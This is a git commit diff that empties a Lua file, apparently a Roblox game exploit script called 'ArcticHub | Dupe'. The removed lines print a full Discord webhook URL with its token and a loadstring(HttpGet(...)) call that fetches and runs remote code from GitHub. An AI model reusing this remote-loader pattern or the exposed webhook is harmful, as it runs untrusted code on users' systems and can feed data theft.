54bf96ce1944266dbfd24cdc24bf53aa6631f88d
ArcticExploits <133304636+ArcticExploits@users.noreply.github.com>
2023-05-12 19:10:18 -0700

    Update ArcticHubPSX.lua

--- ArcticHubPSX.lua
+++ ArcticHubPSX.lua
@@ -1,4 +1,1 @@
-_G.Username = "Thatdogekingyt" 
-_G.HubName = "ArcticHub | Dupe"
-_G.WebhookUrl = "https://discord.com/api/webhooks/1106422122617765990/lrKBDlHDjQLN_Wmu_rivm8twbYYNep4B7YLPNHcQaUZOwZbMcaKpKS0drNo3Qa2wNmzv"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
+
